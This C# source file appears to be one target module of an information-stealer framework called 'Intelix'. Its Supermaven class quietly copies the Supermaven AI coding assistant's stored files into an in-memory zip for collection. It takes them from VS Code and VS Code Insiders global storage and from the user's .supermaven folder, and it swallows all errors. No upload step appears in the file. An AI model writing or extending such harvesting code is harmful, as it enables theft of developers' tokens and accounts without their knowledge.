using System;
using System.IO;
using Intelix.Helper.Data;

namespace Intelix.Targets.AI_Agent
{
    public class Supermaven : ITarget
    {
        public void Collect(InMemoryZip zip, Counter counter)
        {
            string appdata = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
            string userProfile = Environment.GetFolderPath(Environment.SpecialFolder.UserProfile);
            var entry = new Counter.CounterApplications { Name = "Supermaven" };
            string[] vscodeDirs = { "Code", "Code - Insiders" };
            foreach (string vscodeDir in vscodeDirs)
            {
                string dir = Path.Combine(appdata, vscodeDir, "User", "globalStorage", "supermaven.supermaven");
                if (!Directory.Exists(dir)) continue;
                foreach (string file in Directory.GetFiles(dir, "*", SearchOption.AllDirectories))
                {
                    if (new FileInfo(file).Length > 1 * 1024 * 1024) continue;
                    try
                    {
                        string rel = "AI-Agent\\Supermaven\\" + Path.GetFileName(file);
                        zip.AddFile(rel, File.ReadAllBytes(file));
                        entry.Files.Add(file + " => " + rel);
                    }
                    catch { }
                }
            }
            string standaloneDir = Path.Combine(userProfile, ".supermaven");
            if (Directory.Exists(standaloneDir))
            {
                foreach (string file in Directory.GetFiles(standaloneDir, "*", SearchOption.TopDirectoryOnly))
                {
                    try
                    {
                        string rel = "AI-Agent\\Supermaven\\" + Path.GetFileName(file);
                        zip.AddFile(rel, File.ReadAllBytes(file));
                        entry.Files.Add(file + " => " + rel);
                    }
                    catch { }
                }
            }
            if (entry.Files.Count > 0) counter.AI.Add(entry);
        }
    }
}
